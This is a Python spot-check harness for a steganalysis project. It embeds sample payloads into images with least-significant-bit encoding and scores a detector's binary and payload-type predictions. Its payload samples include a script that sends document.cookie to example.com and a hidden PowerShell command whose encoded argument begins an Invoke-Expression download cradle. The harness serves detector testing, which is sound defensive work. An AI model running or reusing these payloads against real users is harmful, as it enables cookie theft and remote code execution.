"""Spot-check the published models on clean and payload-bearing images.

This is the harness behind the numbers in ``docs/evaluation.md``. It is not a
benchmark: it reports what the shipped models do on a handful of images using
a simple least-significant-bit embedding, and it makes no claim about how the
models behave on the data they were trained on.

Usage:

    python eval/spot_check.py                      # synthetic images only
    python eval/spot_check.py --images path/to/pngs
    python eval/spot_check.py --images path/to/pngs --limit 8
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

import numpy as np
from PIL import Image

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT))

from steganalysis.inference import StegoDetector  # noqa: E402

PAYLOADS = {
    "html": (
        "<html><body><h1>Hidden</h1>"
        "<script>var beacon=1;</script></body></html>"
    )
    * 4,
    "js": (
        "<script>fetch('https://example.com/x?d='+document.cookie)</script>"
    )
    * 4,
    "ps": (
        "powershell -NoP -NonI -W Hidden -Enc "
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
    ),
}

SUPPORTED_SUFFIXES = {".png", ".jpg", ".jpeg", ".bmp", ".tif", ".tiff", ".webp"}


def embed_payload(image: Image.Image, payload: str, bits: int = 2) -> Image.Image:
    """Write ``payload`` into the low ``bits`` of the flattened RGB plane."""
    array = np.array(image.convert("RGB"), dtype=np.uint8)
    mask = 0xFF ^ ((1 << bits) - 1)
    flat = (array & mask).flatten()

    payload_bits: list[int] = []
    for byte in payload.encode("utf-8"):
        for shift in range(7, -1, -1):
            payload_bits.append((byte >> shift) & 1)

    if len(payload_bits) > flat.size:
        raise ValueError(
            f"payload needs {len(payload_bits)} bits but the image holds {flat.size}"
        )

    embedded = flat | np.array(
        payload_bits + [0] * (flat.size - len(payload_bits)), dtype=np.uint8
    )
    return Image.fromarray(embedded.reshape(array.shape), "RGB")


def synthetic_images() -> list[tuple[str, Image.Image]]:
    """Deterministic images so the harness runs without external files."""
    width, height = 320, 240

    gradient = Image.new("RGB", (width, height))
    pixels = gradient.load()
    for y in range(height):
        for x in range(width):
            pixels[x, y] = (
                x * 255 // (width - 1),
                y * 255 // (height - 1),
                int(128 + 80 * np.sin(x / 40)),
            )

    flat = Image.new("RGB", (width, height), (90, 140, 70))

    xs = np.linspace(0, 6, width)
    ys = np.linspace(0, 6, height)
    grid_x, grid_y = np.meshgrid(xs, ys)
    smooth = Image.fromarray(
        np.stack(
            [
                np.sin(grid_x) * 60 + 120,
                np.cos(grid_y) * 50 + 130,
                np.sin(grid_x + grid_y) * 40 + 110,
            ],
            axis=-1,
        ).astype(np.uint8),
        "RGB",
    )

    return [("gradient", gradient), ("flat colour", flat), ("smooth pattern", smooth)]


def load_images(directory: Path, limit: int | None) -> list[tuple[str, Image.Image]]:
    paths = sorted(
        path
        for path in directory.rglob("*")
        if path.is_file() and path.suffix.lower() in SUPPORTED_SUFFIXES
    )
    if limit is not None:
        paths = paths[:limit]
    return [(path.name, Image.open(path)) for path in paths]


def summarise(detector: StegoDetector, images: list[tuple[str, Image.Image]]) -> None:
    header = f"{'image':24s} {'truth':7s} {'binary':7s} {'conf':>6s} {'payload':8s} {'conf':>6s} {'ok':>4s}"
    print(header)
    print("-" * len(header))

    binary_correct = binary_total = 0
    payload_correct = payload_total = 0

    for name, image in images:
        cases = [("clean", image)]
        for label, payload in PAYLOADS.items():
            try:
                cases.append((label, embed_payload(image, payload)))
            except ValueError:
                continue

        for truth, candidate in cases:
            result = detector.predict(candidate)
            binary = result["binary_prediction"]
            multi = result["multiclass_prediction"]

            detected = binary["class"]
            ok = detected == truth if truth == "clean" else detected == "stego"
            binary_correct += int(ok)
            binary_total += 1

            payload_ok = ""
            if truth != "clean":
                payload_total += 1
                if multi["payload_type"] == truth:
                    payload_correct += 1
                    payload_ok = "ok"
                else:
                    payload_ok = "miss"

            print(
                f"{name[:24]:24s} {truth:7s} {detected:7s} {binary['confidence']:6.2f} "
                f"{multi['payload_type']:8s} {max(multi['probabilities'].values()):6.2f} "
                f"{'yes' if ok else 'no ':>4s} {payload_ok}"
            )

    print()
    print(f"binary detection : {binary_correct}/{binary_total} correct")
    if payload_total:
        print(f"payload typing   : {payload_correct}/{payload_total} correct")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--images", type=Path, help="directory of images to test")
    parser.add_argument("--limit", type=int, help="use at most this many images")
    parser.add_argument(
        "--models",
        type=Path,
        default=REPO_ROOT / "models",
        help="artifact directory (default: <repo>/models)",
    )
    args = parser.parse_args()

    detector = StegoDetector.load(args.models)

    if args.images:
        images = load_images(args.images, args.limit)
        if not images:
            raise SystemExit(f"No supported images found in {args.images}")
    else:
        images = synthetic_images()

    summarise(detector, images)
    return 0


if __name__ == "__main__":
    sys.exit(main())
